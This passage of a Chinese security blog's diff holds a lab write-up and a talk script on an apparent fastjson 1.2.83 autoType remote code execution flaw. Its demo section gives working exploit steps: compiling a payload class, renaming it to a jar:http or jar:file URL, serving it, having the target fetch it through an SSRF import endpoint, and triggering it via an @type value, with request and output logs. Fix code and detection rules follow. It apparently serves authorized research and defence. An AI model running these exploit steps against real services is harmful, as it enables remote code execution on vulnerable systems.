+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">普通 JavaBean</span><br><span class="line">  JavaBeanDeserializer.createInstance</span><br><span class="line">    → FastjsonASMDeserializer_1_Evil.createInstance   ← ASM 生成的字节码里 new &lt;斜杠内部名&gt;</span><br><span class="line">    → NoClassDefFoundError（网络流已关，取不到字节）</span><br><span class="line"></span><br><span class="line">Throwable 子类</span><br><span class="line">  ThrowableDeserializer</span><br><span class="line">    → clazz.newInstance()                              ← 反射，手里已有 Class 对象，不再按名解析</span><br><span class="line">    → &lt;clinit&gt; 执行，实例化成功</span><br></pre></td></tr></table></figure>
+
+<p>普通类走 ASM 反序列化器：fastjson 把类名转成 ASM 内部名（斜杠形式 <code>jar:http://...</code>）写进 <code>new</code> 指令，JVM 拿这个名字再解析一次，加载器按名找不到，流又已经关了。Throwable 子类走 <code>ThrowableDeserializer</code>，反射实例化，<strong>不需要第二次按名解析</strong>，一次下载就够。</p>
+<p>所以原文那句”JDK 8 上 <code>jar:http://</code> 一条 JSON 打穿”是成立的。他把载荷类命名为 <code>foo.Exception</code> 不是随手取的——那正是让 fastjson 走 Throwable 分支的开关。我们最初拿 <code>class Evil</code> 去测，失败后归因成”JDK 8 不行””流已关”，是把载荷设计问题误判成了平台限制。</p>
+<p>实测证据（8u66 + Windows + <code>asmEnable</code> 默认 true）：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">/debug  → &#123;&quot;resource&quot;:&quot;jar:http://2130706433:19092/impe!/EvilEx.class&quot;,</span><br><span class="line">           &quot;stream&quot;:true,&quot;bytes&quot;:1756,&quot;jsonTypeDirect&quot;:true&#125;</span><br><span class="line">/parse  → &#123;&quot;ok&quot;:true,&quot;class&quot;:&quot;jar:http:..2130706433:19092.impe!.EvilEx&quot;,&quot;result&quot;:&quot;...: poc&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>C:\fj\rce-proof-http.txt</code>：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">CVE-2026-16723 single-stage (jar:http dot-form)</span><br><span class="line">java   : 1.8.0_66</span><br><span class="line">loader : org.springframework.boot.loader.LaunchedURLClassLoader@21b8d17c</span><br></pre></td></tr></table></figure>
+
+<p> 一个实操细节：<strong>一个类名在一个 JVM 里只执行一次</strong>。<code>TypeUtils.loadClass</code> 按类名缓存，第二次返回已初始化的 <code>Class</code>，<code>ok:true</code>、实例照建，但 <code>&lt;clinit&gt;</code> 不重跑——两条链都一样（<code>jar:http:..</code> 与 <code>jar:file:..</code> 实测均已确认）。演示前重启靶机，或换名字；判断依据看 proof 文件的修改时间。</p>
+<p>那为什么还需要两阶段？因为<strong>目标未必给得起类继承 <code>Throwable</code> 的自由</strong>——攻击者控的是 <code>@type</code>，载荷类由攻击者自己写，所以严格说单阶段总是可行。两阶段的真实价值在另外两处：</p>
+<ul>
+<li>目标 <strong>JDK 9+</strong> 时，<code>defineClass</code> 对类名的处理更严（实测 21 抛 <code>ClassFormatError: Illegal class name</code>），点号形式也不一定过得去，落盘 + <code>jar:file:</code> 更稳；</li>
+<li>当链路里<strong>只有一个 SSRF、没有反序列化点能直接吃 <code>jar:http:</code> 串</strong>时，先把字节投递到磁盘，再在别处触发，也更符合真实场景的分工。</li>
+</ul>
+<h3 id="4-3-两阶段与-proc-self-fd：为什么要”再读一次”"><a href="#4-3-两阶段与-proc-self-fd：为什么要”再读一次”" class="headerlink" title="4.3 两阶段与 /proc/self/fd：为什么要”再读一次”"></a>4.3 两阶段与 <code>/proc/self/fd</code>：为什么要”再读一次”</h3><p>单阶段失败的那一类载荷（非 <code>Throwable</code>），卡点是<strong>第二次按名解析</strong>。Linux 上有一招可以把它救回来，而且不用攻击者写文件：</p>
+<p>JVM 用 <code>jar:http://</code> 拉远程 jar 时，会缓存成 <code>/tmp/jar_cache*.tmp</code>，文件句柄保持打开。fd 指向的是一个<strong>可重复读的文件</strong>，不是一次性网络流：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">@type = jar:http:..attack.er.19090.p!.foo.Exception   → JVM 自己下载、自己缓存</span><br><span class="line">@type = jar:file:.proc.self.fd.N!.fdN.Exception       → 复用那个 fd，第二次读也命中</span><br></pre></td></tr></table></figure>
+
+<p>这就是官方公告敢说”唯一部署前置条件是 fat-jar”的底气：投递由 JVM 自己完成，目标不需要任何上传功能。</p>
+<p>Windows 没有 <code>/proc/self/fd</code>，<code>jar_cache*.tmp</code> 文件名随机、又没有 fd 路径可指，这条路不存在——要么让载荷类继承 <code>Throwable</code>（单阶段，见 4.2），要么真的写一份到磁盘（<code>/import</code> 补的就是这一环）。</p>
+<table>
+<thead>
+<tr>
+<th>层面</th>
+<th>由什么决定</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>类名能否通过 <code>preDefineClass</code></td>
+<td>纯字符串规则：不能含 <code>/</code>，点号写；与 JDK、OS 无关</td>
+</tr>
+<tr>
+<td>点号形式的远程 jar 能否 <code>defineClass</code></td>
+<td>能（8u66 实测，<code>definedBy=LaunchedURLClassLoader</code>）</td>
+</tr>
+<tr>
+<td>完整 <code>JSON.parse</code> 能否走完</td>
+<td>类继承 <code>Throwable</code> → 反射实例化，一次下载即可；否则需可重读的字节源（fd 或磁盘文件）</td>
+</tr>
+<tr>
+<td>能否免落地</td>
+<td>单阶段路径在 Windows &#x2F; Linux 都可；fd 路径仅 Linux</td>
+</tr>
+</tbody></table>
+<h3 id="4-4-谁负责哪一段"><a href="#4-4-谁负责哪一段" class="headerlink" title="4.4 谁负责哪一段"></a>4.4 谁负责哪一段</h3><table>
+<thead>
+<tr>
+<th>阶段</th>
+<th>谁干的</th>
+<th>证据</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>把 jar 字节搬到目标（磁盘或 JVM 缓存）</td>
+<td>业务功能（URL 导入 &#x2F; 附件上传 &#x2F; 临时文件写入），或 JVM 自己的 <code>jar:</code> 协议处理</td>
+<td>HTTP 服务日志一次 <code>GET /payloadf</code>；<code>C:\fj\uploads\imp</code> 多一个 1060 字节文件</td>
+</tr>
+<tr>
+<td>把字节变成正在运行的类</td>
+<td>fastjson <code>checkAutoType</code> + <code>defineClass</code></td>
+<td><code>/parse</code> 返回 <code>ok:true</code>；proof 文件里 <code>LaunchedURLClassLoader</code>；桌面计算器</td>
+</tr>
+</tbody></table>
+<p>两段之间<strong>没有耦合</strong>：投递用什么方式都行，只要有字节能被 <code>jar:</code> 寻址。单阶段只是把两段压缩进同一个请求，结构没变。</p>
+<h3 id="4-5-SSRF-在这条链里的准确定位"><a href="#4-5-SSRF-在这条链里的准确定位" class="headerlink" title="4.5 SSRF 在这条链里的准确定位"></a>4.5 SSRF 在这条链里的准确定位</h3><p>需要分清两件事，否则容易被质疑夸大：</p>
+<ul>
+<li><strong><code>/import</code> 端点本身</strong> &#x3D; SSRF + 一份受限的文件写入。它能让靶机访问任意 http&#x2F;https 地址、把响应体写到 <code>C:\fj\uploads\&lt;name&gt;</code>（<code>name</code> 有 <code>startsWith(dir)</code> 校验，<code>../</code> 会被拒）。它自己<strong>不含任何执行能力</strong>。</li>
+<li><strong>整条链</strong> &#x3D; SSRF 投递 + fastjson autoType RCE。执行能力来自 fastjson，不来自 SSRF。</li>
+</ul>
+<p>所以”SSRF 到 RCE”里的 SSRF 是 <strong>delivery</strong>，不是绕过手段。诚实的说法是：<em>SSRF 让我们不需要接触目标主机就能完成投递</em>——在没有上传入口、只有”填个 URL 帮你下载”这类功能的场景里，这一环就是全部。</p>
+<p>如果只想要一个<strong>无副作用</strong>的 SSRF 证据（不写盘、不执行），用诊断端点：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET /debug?type=jar:http://192.168.244.131:19090/payloadf!.Evil</span><br></pre></td></tr></table></figure>
+
+<p>只有一次出站 <code>GET</code>，返回 <code>stream:true</code>、<code>bytes:1060</code>，然后 <code>checkAutoType</code> 报 <code>IllegalName</code>。全程不落盘。</p>
+<hr>
+<h2 id="5-现场演示"><a href="#5-现场演示" class="headerlink" title="5. 现场演示"></a>5. 现场演示</h2><p>完整步骤见 <code>handson/SSRF-RCE.md</code>，这里是压缩版。</p>
+<p><strong>① 靶机</strong>（Windows，窗口不关）</p>
+<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /d C:\fj</span><br><span class="line">java -jar app2.jar --server.port=<span class="number">18086</span></span><br><span class="line">curl http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">18086</span>/status</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;fastjsonVersion&quot;</span><span class="punctuation">:</span><span class="string">&quot;1.2.83&quot;</span><span class="punctuation">,</span><span class="attr">&quot;autoTypeSupport&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="attr">&quot;javaVersion&quot;</span><span class="punctuation">:</span><span class="string">&quot;1.8.0_66&quot;</span><span class="punctuation">,</span><span class="attr">&quot;vulnerable&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>② 虚机写三个文件</strong>：<code>Evil.java</code>（<code>@JSONType</code> + <code>static{}</code> 写 proof、弹计算器）、桩注解 <code>com/alibaba/fastjson/annotation/JSONType.java</code>（<code>@Retention(RUNTIME)</code> 不可省）、<code>patch_name.py</code>。</p>
+<p><strong>③ 编译</strong>（class 版本必须 52，靶机是 8u66）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">javac --release 8 -nowarn -d classes Evil.java com/alibaba/fastjson/annotation/JSONType.java</span><br><span class="line"><span class="built_in">cp</span> classes/Evil.class clean.class</span><br><span class="line"><span class="comment"># 1639 bytes</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>④ 改名 + 打包</strong>（三样要对上：出现 <code>类名: Evil -&gt; ...</code>、字节变 1668、<code>this_class</code> 是那串路径）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 patch_name.py clean.class <span class="string">&#x27;jar:file:/C:/fj/uploads/imp!/Evil&#x27;</span> classes/Evil.class</span><br><span class="line">python3 -c <span class="string">&quot;import zipfile;z=zipfile.ZipFile(&#x27;payloadf&#x27;,&#x27;w&#x27;,zipfile.ZIP_DEFLATED);z.write(&#x27;classes/Evil.class&#x27;,&#x27;Evil.class&#x27;);z.close()&quot;</span></span><br><span class="line"><span class="comment"># 1060 bytes, [&#x27;Evil.class&#x27;]</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>⑤ 虚机起服务</strong>（必须在本目录，否则 404）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/ssrf &amp;&amp; python3 -m http.server 19090 --<span class="built_in">bind</span> 0.0.0.0</span><br></pre></td></tr></table></figure>
+
+<p><strong>⑥ 让靶机自己取</strong>（SSRF 就在这里）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">IP=$(hostname -I | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line">curl -s <span class="string">&quot;http://192.168.244.1:18086/import?url=http://<span class="variable">$IP</span>:19090/payloadf&amp;name=imp&quot;</span></span><br><span class="line"><span class="comment"># &#123;&quot;saved&quot;:&quot;C:\\fj\\uploads\\imp&quot;,&quot;bytes&quot;:1060,&quot;typeName&quot;:&quot;jar:file:.C:.fj.uploads.imp!.Evil&quot;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>虚机窗口出现 <code>192.168.244.1 - - &quot;GET /payloadf HTTP/1.1&quot; 200</code>。<strong>请求是靶机发起的，我们一个字节都没给它。</strong></p>
+<p><strong>⑦ 触发</strong>（GET；POST 会被部分安全软件 RST，见下方注）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -s <span class="string">&#x27;http://192.168.244.1:18086/trace?type=jar:file:.C:.fj.uploads.imp!.Evil&amp;step=parse&#x27;</span>; <span class="built_in">echo</span></span><br><span class="line"><span class="comment"># &#123;&quot;type&quot;:&quot;jar:file:.C:.fj.uploads.imp!.Evil&quot;,&quot;jsonParse&quot;:&quot;...&quot;,&quot;instance&quot;:&quot;...@xxxx&quot;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p> 靶场的 <code>/trace?step=parse</code> 内部执行的就是 <code>JSON.parse(&quot;{\&quot;@type\&quot;:\&quot;...\&quot;}&quot;)</code>，与 <code>/parse</code> 是同一个漏洞入口，只是走 GET。实测这台 Windows 上 POST 会被安全软件重置（<code>curl: (56) Recv failure</code>），GET 正常——<strong>遇到 POST 失效先怀疑本机安全软件，别怀疑载荷</strong>。安全软件关掉后 POST <code>/parse</code> 一样可用。</p>
+<p><strong>⑧ 验收</strong></p>
+<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span> C:\fj\rce-proof-http.txt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">CVE-2026-16723 SSRF-stage - code executed in target JVM</span><br><span class="line">user   : MECHREVO</span><br><span class="line">java   : 1.8.0_66</span><br><span class="line">loader : org.springframework.boot.loader.LaunchedURLClassLoader@21b8d17c</span><br></pre></td></tr></table></figure>
+
+<p><code>loader</code> 那行是最硬的证据：这个类加载器只存在于靶机 JVM 里，虚机不可能给出。</p>
+<p><strong>再演示一次要注意</strong>：一个类名在一个 JVM 里只执行一次（两条链都是），同名第二次 <code>ok:true</code> 但 <code>&lt;clinit&gt;</code> 不重跑。重启靶场最稳，或换名字——判断看 proof 文件的时间戳有没有更新。</p>
+<h3 id="5-2-更短的版本：一条-JSON，不落盘"><a href="#5-2-更短的版本：一条-JSON，不落盘" class="headerlink" title="5.2 更短的版本：一条 JSON，不落盘"></a>5.2 更短的版本：一条 JSON，不落盘</h3><p>如果台上想强调”攻击者没写任何文件”，把 ②③④⑥⑦ 换成下面这一条（载荷类改成 <code>extends Exception</code>，其余不变）：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">javac --release 8 -nowarn -d classes EvilEx.java com/alibaba/fastjson/annotation/JSONType.java</span><br><span class="line"><span class="built_in">cp</span> classes/EvilEx.class clean.class</span><br><span class="line">python3 patch_name.py clean.class <span class="string">&#x27;jar:http://&lt;十进制IP&gt;:19090/impe!/EvilEx&#x27;</span> classes/EvilEx.class</span><br><span class="line">python3 -c <span class="string">&quot;import zipfile;z=zipfile.ZipFile(&#x27;payloadf&#x27;,&#x27;w&#x27;,zipfile.ZIP_DEFLATED);z.write(&#x27;classes/EvilEx.class&#x27;,&#x27;EvilEx.class&#x27;);z.close()&quot;</span></span><br><span class="line"><span class="built_in">cd</span> ~/ssrf &amp;&amp; python3 -m http.server 19090 --<span class="built_in">bind</span> 0.0.0.0</span><br></pre></td></tr></table></figure>
+
+<p>改名用的字符串要和 <code>@type</code> 的点号形式<strong>一一对应</strong>（点 → <code>/</code> 就是它查资源时用的路径）：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">patch 写入 this_class : jar:http://&lt;十进制IP&gt;:19090/impe!/EvilEx</span><br><span class="line">@type 点号形式        : jar:http:..&lt;十进制IP&gt;:19090.impe!.EvilEx</span><br></pre></td></tr></table></figure>
+
+<p>四个 IP 位置<strong>全部用十进制</strong>，一个点都不能留。查法：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">IP=$(hostname -I | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)                                  <span class="comment"># 点分：192.168.244.131</span></span><br><span class="line">IFS=. <span class="built_in">read</span> a b c d &lt;&lt;&lt; <span class="string">&quot;<span class="variable">$IP</span>&quot;</span>; DEC=$((a*<span class="number">16777216</span> + b*<span class="number">65536</span> + c*<span class="number">256</span> + d))</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;IP=<span class="variable">$IP</span> DEC=<span class="variable">$DEC</span>&quot;</span>                                                <span class="comment"># 3232298115</span></span><br></pre></td></tr></table></figure>
+
+<p>点分写法只用在 <code>curl http://$IP:19090/...</code> 这种真实 URL 上；<code>@type</code> 和 <code>this_class</code> 里必须用 <code>DEC</code>。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -s <span class="string">&#x27;http://192.168.244.1:18086/trace?type=jar:http:..&lt;十进制IP&gt;:19090.impe!.EvilEx&amp;step=parse&#x27;</span>; <span class="built_in">echo</span></span><br><span class="line"><span class="comment"># &#123;&quot;type&quot;:&quot;jar:http:..2130706433:19092.impe!.EvilEx&quot;,&quot;jsonParse&quot;:&quot;...&quot;,&quot;instance&quot;:&quot;...&quot;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>虚机日志里只有一次 <code>GET /impe</code>，靶机磁盘上没有任何新文件，proof 文件和计算器照样出现。</p>
+<blockquote>
+<p>这条路唯一的要求：<strong>载荷类必须 <code>extends Exception</code>（或任意 <code>Throwable</code>）</strong>。原因见 4.2——普通 JavaBean 会走 ASM 反序列化器，实例化时二次按名解析，流已关闭就失败。</p>
+</blockquote>
+<hr>
+<h2 id="6-前提与边界"><a href="#6-前提与边界" class="headerlink" title="6. 前提与边界"></a>6. 前提与边界</h2><h3 id="6-1-必须同时满足"><a href="#6-1-必须同时满足" class="headerlink" title="6.1 必须同时满足"></a>6.1 必须同时满足</h3><table>
+<thead>
+<tr>
+<th>条件</th>
+<th>说明</th>
+<th>不满足会怎样</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>目标用 fastjson ≤ 1.2.83 解析不可信 JSON</td>
+<td>且未开 SafeMode</td>
+<td><code>autoType is not support.</code></td>
+</tr>
+<tr>
+<td>请求体里有 <code>@type</code></td>
+<td>由业务代码透传原始 body</td>
+<td>没有入口</td>
+</tr>
+<tr>
+<td>字节可被 <code>jar:</code> 寻址</td>
+<td>链一：目标能出网到攻击者 HTTP；链二：能落地到已知路径</td>
+<td><code>stream=false</code></td>
+</tr>
+<tr>
+<td>class 版本 ≤ 目标 JDK</td>
+<td><code>javac --release</code> 对齐</td>
+<td><code>UnsupportedClassVersionError</code></td>
+</tr>
+<tr>
+<td>链一额外要求：载荷类继承 <code>Throwable</code></td>
+<td>走 <code>ThrowableDeserializer</code> 反射实例化</td>
+<td><code>NoClassDefFoundError</code> at <code>FastjsonASMDeserializer</code></td>
+</tr>
+</tbody></table>
+<p>链二没有最后一条，代价是多一个投递步骤；链一省掉投递，代价是载荷形态受限。</p>
+<h3 id="6-2-这不是”任意文件写”"><a href="#6-2-这不是”任意文件写”" class="headerlink" title="6.2 这不是”任意文件写”"></a>6.2 这不是”任意文件写”</h3><p><code>/upload</code> 和 <code>/import</code> 都做了 <code>target.startsWith(dir)</code> 校验，只能落在 <code>C:\fj\uploads\</code> 下，<code>../</code> 直接抛异常。真实系统里的等价物是”附件上传目录”——文件名可控，目录不可控。</p>
+<h3 id="6-3-只有-SSRF-时能做什么"><a href="#6-3-只有-SSRF-时能做什么" class="headerlink" title="6.3 只有 SSRF 时能做什么"></a>6.3 只有 SSRF 时能做什么</h3><p>如果目标没有 fastjson 这个入口，同一个缺陷仍然是一个<strong>静默的 SSRF &#x2F; 任意文件读</strong>原语：能探测内网端口、能读 <code>file:</code> 协议指向的文件、能判断某路径是否存在（<code>stream</code> 是否为 null）。这部分能力不需要 RCE 就已经有危害，只是上限不同。</p>
+<h3 id="6-4-口径"><a href="#6-4-口径" class="headerlink" title="6.4 口径"></a>6.4 口径</h3><p>自有靶场、授权范围内研究。载荷只做两件事：写一个证明文件、启动一次计算器。不含反弹 shell、不含持久化、不含横向移动。靶场不暴露公网，对外分享保持同样口径。</p>
+<hr>
+<h2 id="7-修复与检测"><a href="#7-修复与检测" class="headerlink" title="7. 修复与检测"></a>7. 修复与检测</h2><h3 id="7-1-1-2-84-的-4-行"><a href="#7-1-1-2-84-的-4-行" class="headerlink" title="7.1 1.2.84 的 4 行"></a>7.1 1.2.84 的 4 行</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (TypeUtils.hasIllegalTypeNameChars(typeName)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">hasIllegalTypeNameChars</span><span class="params">(String typeName)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> typeName.indexOf(<span class="string">&#x27;:&#x27;</span>) &gt;= <span class="number">0</span> || typeName.indexOf(<span class="string">&#x27;!&#x27;</span>) &gt;= <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>关键在于位置</strong>：它在 1479 行的探测<strong>之前</strong>。所以 <code>jar:</code> &#x2F; <code>!</code> 一出现，请求在入口就被拒，连”读字节”都到不了。</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">SSRF（1484）              ← 被拦</span><br><span class="line">读字节 + 注解识别（1492）  ← 被拦</span><br><span class="line">defineClass + &lt;clinit&gt;    ← 被拦</span><br></pre></td></tr></table></figure>
+
+<p>值得说清：<strong>它修的是”用 <code>@type</code> 触达类加载器”这条路，不是类加载器本身。</strong> 底层 <code>URLClassLoader</code> 依然可以被直接调用去加载任意文件——只是不再有一条从 JSON 输入到它的通道。</p>
+<h3 id="7-2-防守清单"><a href="#7-2-防守清单" class="headerlink" title="7.2 防守清单"></a>7.2 防守清单</h3><table>
+<thead>
+<tr>
+<th>层次</th>
+<th>措施</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>组件</td>
+<td>升级 1.2.84+；无法升级的挂 <code>SafeMode</code>（1312 那道闸是唯一真正管用的开关）</td>
+</tr>
+<tr>
+<td>配置</td>
+<td>关 <code>autoTypeSupport</code>（注意：<strong>关着也挡不住本漏洞</strong>，别当唯一防线）</td>
+</tr>
+<tr>
+<td>代码</td>
+<td>不要用 <code>JSON.parse</code> &#x2F; <code>parseObject</code> 处理不可信输入；固定 DTO；<code>Feature.DisableSpecialKeyDetect</code></td>
+</tr>
+<tr>
+<td>架构</td>
+<td>上传目录与业务目录隔离；上传文件<strong>不可被类加载器寻址</strong>；jar 落地目录不给 Web 进程读权限</td>
+</tr>
+<tr>
+<td>流量</td>
+<td>拦 <code>@type</code> 值里出现 <code>:</code>、<code>!</code>、<code>..</code>、<code>jar:</code>、<code>http:</code> 的请求</td>
+</tr>
+<tr>
+<td>主机</td>
+<td>关注 <code>defineClass</code> 的类名含 URL 特征；关注 Java 进程派生 <code>cmd</code>&#x2F;<code>sh</code>&#x2F;<code>calc</code></td>
+</tr>
+</tbody></table>
+<h3 id="7-3-检测特征"><a href="#7-3-检测特征" class="headerlink" title="7.3 检测特征"></a>7.3 检测特征</h3><p>最有效的一条：**<code>@type</code> 的值不是合法 Java 类名。**</p>
+<p>合法类名只有 <code>[A-Za-z_$][A-Za-z0-9_$.]*</code>。只要出现 <code>:</code>、<code>!</code>、<code>/</code>、<code>..</code>，就是异常——规则简单、误报极低，不依赖任何 CVE 编号。</p>
+<hr>
+<h2 id="8-三个结论"><a href="#8-三个结论" class="headerlink" title="8. 三个结论"></a>8. 三个结论</h2><ol>
+<li><strong>“加了校验”不等于”校验有效”。</strong> 四道闸看起来很严密，但检查的都是”类的名字”，攻击者塞进来的是一段”路径语法”——维度不对，再多闸也没用。</li>
+<li><strong>任何”自声明即可信”的机制，在被检查对象可控时都会失效。</strong> <code>@JSONType</code>、各种 <code>trusted=true</code> 的元数据，本质是同一个错误。</li>
+<li><strong>修复要修在入口的语法上，不是修补黑名单。</strong> 4 行字符校验 &gt; 十几轮类名黑名单。</li>
+</ol>
+]]></content>
+      <categories>
+        <category>技术</category>
+        <category>JAVA安全</category>
+        <category>Fastjson</category>
+      </categories>
+  </entry>
+  <entry>
     <title>关于CVE-2026-16723：fastjson 1.2.83 相关源码注解</title>
     <url>/2026/11/10/%E6%8A%80%E6%9C%AF/JAVA%E5%AE%89%E5%85%A8/Fastjson/SOURCE/</url>
     <content><![CDATA[<h1 id="CVE-2026-16723：fastjson-1-2-83-源码注解"><a href="#CVE-2026-16723：fastjson-1-2-83-源码注解" class="headerlink" title="CVE-2026-16723：fastjson 1.2.83 源码注解"></a>CVE-2026-16723：fastjson 1.2.83 源码注解</h1><blockquote>
@@ -874,119 +1384,425 @@
       </categories>
   </entry>
   <entry>
+    <title>分享演讲稿</title>
+    <url>/2026/11/12/%E6%8A%80%E6%9C%AF/JAVA%E5%AE%89%E5%85%A8/Fastjson/TALK-SCRIPT/</url>
+    <content><![CDATA[<h1 id="分享讲稿：SSRF-到-RCE"><a href="#分享讲稿：SSRF-到-RCE" class="headerlink" title="分享讲稿：SSRF 到 RCE"></a>分享讲稿：SSRF 到 RCE</h1><p> 配套材料（讲的时候投屏用）</p>
+<ul>
+<li><code>REPORT-SSRF-TO-RCE.md</code> —— 讲原理时翻，第 1&#x2F;2&#x2F;3 节</li>
+<li><code>handson/SSRF-RCE.md</code> —— 动手时对照，第 3～9 节（链一）、10～15 节（链二）</li>
+</ul>
+<p> 场景：Windows 跑靶机 <code>192.168.244.1:18086</code>，虚机当攻击者 <code>192.168.244.131</code><br> 总时长约 18 分钟。标了【可删】的段落整段跳过就是 12 分钟版。</p>
+<hr>
+<h2 id="开场：先给结果（0-00-–-0-40）"><a href="#开场：先给结果（0-00-–-0-40）" class="headerlink" title="开场：先给结果（0:00 – 0:40）"></a>开场：先给结果（0:00 – 0:40）</h2><p>【动作】两个窗口并排放好：左边虚机终端，右边 Windows 靶机。靶场已经在跑。</p>
+<p>大家好。今天这个分享，我先给结果，再讲为什么。</p>
+<p>我这边这台是攻击机，Linux。那边那台是靶机，Windows，跑着一个 Spring Boot 应用，JDK 8，fastjson 1.2.83，全是默认配置。</p>
+<p>等一下我在这边发一个请求过去，那边那台机器的桌面上会弹出一个计算器。</p>
+<p>【停顿】</p>
+<p>需要先说明一点：<strong>我没有给靶机传任何文件</strong>。是它自己到我这儿来取的。</p>
+<p>这就是今天要讲的这条链——SSRF 到 RCE。</p>
+<hr>
+<h2 id="一、这个漏洞是什么（0-40-–-3-30）"><a href="#一、这个漏洞是什么（0-40-–-3-30）" class="headerlink" title="一、这个漏洞是什么（0:40 – 3:30）"></a>一、这个漏洞是什么（0:40 – 3:30）</h2><p>【动作】切到报告第 1 节。</p>
+<p>先看档案。</p>
+<table>
+<thead>
+<tr>
+<th>项</th>
+<th>值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>组件</td>
+<td>fastjson 1.x</td>
+</tr>
+<tr>
+<td>受影响</td>
+<td><strong>1.2.68 到 1.2.83</strong></td>
+</tr>
+<tr>
+<td>修复</td>
+<td>1.2.84</td>
+</tr>
+<tr>
+<td>评分</td>
+<td>CVSS 9.0</td>
+</tr>
+</tbody></table>
+<p>版本这里请注意：是<strong>一个区间</strong>，不是某一个点。</p>
+<p>以前 fastjson 的那些编号，1.2.42、1.2.47，都是”上一个补丁没打全”，修完就没了。而 1.2.68 这次引入的问题，是<strong>设计本身有问题</strong>，所以整段版本都带着它。只要线上跑的是这个区间里的任意一个版本，问题一模一样。</p>
+<p>【动作】切到报告 1.3 的对比表（官方原话在 1.1，被追问”官方怎么说”时翻那里）。</p>
+<p>这个漏洞和以前那些最大的区别，用一张表就能说清：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>1.2.67 及以前</th>
+<th>1.2.68 ~ 1.2.83</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>攻击者要解决的</td>
+<td>找一个目标已有的、能打的类</td>
+<td><strong>自己写一个类</strong></td>
+</tr>
+<tr>
+<td>第三方依赖</td>
+<td>CommonsCollections、JdbcRowSetImpl…</td>
+<td><strong>零</strong></td>
+</tr>
+<tr>
+<td>执行阶段出网</td>
+<td>JNDI 类要回连</td>
+<td><strong>完全不出网</strong></td>
+</tr>
+</tbody></table>
+<p>以前打 fastjson，payload 是”一段 JSON”，能打成什么样，取决于目标装了哪些库——所以复现经常靠运气。</p>
+<p>这次的 payload 是”一段 class”，代码是我自己写的。目标装了什么，不重要。</p>
+<p>还有两个”不需要”，容易被误解：</p>
+<p><strong>不需要开 autoType。</strong> 很多人以为 <code>autoTypeSupport=false</code> 就安全了。这里不是。<br><strong>不需要目标能出网。</strong> 执行那一段完全在本地，没有任何反连。</p>
+<p>那需要什么？两个条件：目标用 fastjson 解析了我能影响的内容，并且请求体里有 <code>@type</code>。再加一个前提——得有一个 jar 能被 <code>jar:</code> 寻址，这个后面讲。</p>
+<p>一句话概括整条链，请记住这句，后面所有内容都围着它转：</p>
+<blockquote>
+<p><strong>SSRF 负责把字节搬到目标那儿，fastjson 负责把字节变成一个正在运行的类。</strong><br>前半段是投递手段，后半段才是漏洞本体。</p>
+</blockquote>
+<hr>
+<h2 id="二、成因：为什么拦不住（3-30-–-9-00）"><a href="#二、成因：为什么拦不住（3-30-–-9-00）" class="headerlink" title="二、成因：为什么拦不住（3:30 – 9:00）"></a>二、成因：为什么拦不住（3:30 – 9:00）</h2><h3 id="1-入口（3-30）"><a href="#1-入口（3-30）" class="headerlink" title="1. 入口（3:30）"></a>1. 入口（3:30）</h3><p>【动作】切到报告 2.1。</p>
+<p><code>DefaultJSONParser</code> 第 1764 行：</p>
